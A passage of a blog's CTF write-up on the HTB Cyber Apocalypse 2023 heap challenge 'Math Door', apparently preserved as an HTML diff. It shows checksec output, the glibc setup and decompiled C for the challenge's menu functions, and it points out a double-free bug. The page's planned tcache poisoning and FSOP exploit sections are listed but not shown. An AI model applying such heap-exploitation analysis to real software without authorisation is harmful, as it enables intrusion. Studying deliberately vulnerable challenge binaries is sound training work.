@@ -1,0 +1,817 @@
+<!doctype html><html lang="en"><head><title>Math Door | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="HTB CA 2023. 64-bit binary. Heap exploitation. Heap _feng shui_. Tcache poisoning. FSOP"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HTB CA 2023. 64-bit binary. Heap exploitation. Heap _feng shui_. Tcache poisoning. FSOP"><meta itemprop="keywords" content><meta itemprop="name" content="Math Door"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="HTB CA 2023. 64-bit binary. Heap exploitation. Heap _feng shui_. Tcache poisoning. FSOP"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Math Door"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/math-door/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="HTB CA 2023. 64-bit binary. Heap exploitation. Heap _feng shui_. Tcache poisoning. FSOP"><meta name="twitter:description" content="HTB CA 2023. 64-bit binary. Heap exploitation. Heap _feng shui_. Tcache poisoning. FSOP"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Math Door"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/math-door/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/other/htb-cyber-apocalypse/math-door/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB CYBER APOCALYPSE</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/math-door/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/math-door/&amp;text=Math%20Door" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/math-door/&amp;title=Math%20Door" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Math Door</h1><p class="mb4 f6 dib tracked">20 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#setup-environment">Setup environment</a></li><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#allocation-function">Allocation function</a></li><li><a href="#free-function">Free function</a></li><li><a href="#edit-function">Edit function</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#heap-_feng-shui_">Heap <em>feng shui</em></a></li><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>math-door</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
+RELRO:    <span class="code-dark-green">Full RELRO</span>
+Stack:    <span class="code-dark-green">Canary found</span>
+NX:       <span class="code-dark-green">NX enabled</span>
+PIE:      <span class="code-dark-green">PIE enabled</span>
+RUNPATH:  <span class="code-dark-red">b'.'</span>
+</code></pre></div><h2 id="setup-environment">Setup environment</h2><p>We are also provided with the remote Glibc library and loader:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./ld.so</span> <span class="mtku">./libc.so.6</span>
+GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.  
+Copyright (C) 2020 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 9.4.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+For bug reporting instructions, please see:
+&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">math-door</span>
+        linux-vdso.so.1 (0x00007ffed83e6000)
+        libc.so.6 =&gt; ./libc.so.6 (0x00007f39ce44c000)
+        ld.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f39ce647000)
+</code></pre></div><p>The binary is already prepared to use the remote library and loader, so there&rsquo;s nothing more left to do.</p><h2 id="reverse-engineering">Reverse engineering</h2><p>We can use Ghidra to analyze the binary and look at the decompiled source code in C:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> option;</span>
+
+<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span>
+<span class="mtk1">      </span><span class="mtk4">"You are facing the mathy door!</span><span class="mtk6">\n</span><span class="mtk4">The door is blocked by a mysterious riddle that ha</span><span class="mtk4">sn</span><span class="mtk6">\'</span><span class="mtk4">t been  solved since the ancient times...</span><span class="mtk6">\n</span><span class="mtk4">It</span><span class="mtk6">\'</span><span class="mtk4">s said that it</span><span class="mtk6">\'</span><span class="mtk4">s beyond human comprehension. That only  alien bei</span><span class="mtk4">ngs can understand such advanced concepts.</span><span class="mtk6">\n</span><span class="mtk4">Can you math your way through?"</span>  
+<span class="mtk1">      );</span>
+
+<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"1. Create </span><span class="mtk6">\n</span><span class="mtk4">2. Delete </span><span class="mtk6">\n</span><span class="mtk4">3. Add value </span><span class="mtk6">\n</span><span class="mtk4">Action: "</span><span class="mtk1">);</span>
+<span class="mtk1">        option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk8">math</span><span class="mtk1">();</span>
+<span class="mtk1">      }</span>
+
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">LAB_00101605:</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid action!"</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk8">create</span><span class="mtk1">();</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) </span><span class="mtk5">goto</span><span class="mtk1"> LAB_00101605;</span>
+<span class="mtk1">      </span><span class="mtk8">delete</span><span class="mtk1">();</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Basically, we have three options, which look like a heap exploitation challenge.</p><h3 id="allocation-function">Allocation function</h3><p>This is <code>create</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">create</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_chunk;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> c;</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  c </span><span class="mtk5">=</span><span class="mtk1"> counter;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk7 mtki">int</span><span class="mtk1">) counter </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">65</span><span class="mtk1">) {</span>
+<span class="mtk1">    p_chunk </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">malloc</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">18</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (chunks </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) (</span><span class="mtk7 mtki">int</span><span class="mtk1">) c </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> p_chunk;</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Hieroglyph created with index </span><span class="mtk6">%i</span><span class="mtk4">.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, (ulong) counter);</span>  
+<span class="mtk1">    counter </span><span class="mtk5">=</span><span class="mtk1"> counter </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Max amount of hieroglyphs reached."</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>This one allows us to create a chunk with size <code>0x21</code> (hard-coded). The counter is increased, so we can only have up to 65 chunks. We can&rsquo;t enter more information here.</p><h3 id="free-function">Free function</h3><p>This is <code>delete</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">delete</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> index;</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Hieroglyph index:"</span><span class="mtk1">);</span>
+<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">&lt;</span><span class="mtk1"> counter) {</span>
+<span class="mtk1">    </span><span class="mtk8">free</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (chunks </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">));</span>  
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"That hieroglyph doens</span><span class="mtk6">\'</span><span class="mtk4">t exist."</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>In this function we can call <code>free</code> on any index, no matter if it is already free. So, here we can achieve a double free vulnerability, which might be useful later. Also notice that the <code>counter</code> variable is not decreased.</p><h3 id="edit-function">Edit function</h3><p>Finally, we have <code>math</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">math</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> index;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> x;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> y;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> z;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
+<span class="mtk1">  x </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  y </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  z </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Hieroglyph index:"</span><span class="mtk1">);</span>
+<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (counter </span><span class="mtk5">&lt;</span><span class="mtk1"> index) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"That hieroglyph doens</span><span class="mtk6">\'</span><span class="mtk4">t exist."</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Value to add to hieroglyph:"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">x, </span><span class="mtk5">0x</span><span class="mtk6">18</span><span class="mtk1">);</span>
+
+<span class="mtk1">    </span><span class="mtk5">**</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (chunks </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> x </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (chunks </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (chunks </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> y </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (chunks </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (chunks </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> z </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (chunks </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>  
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">)(in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
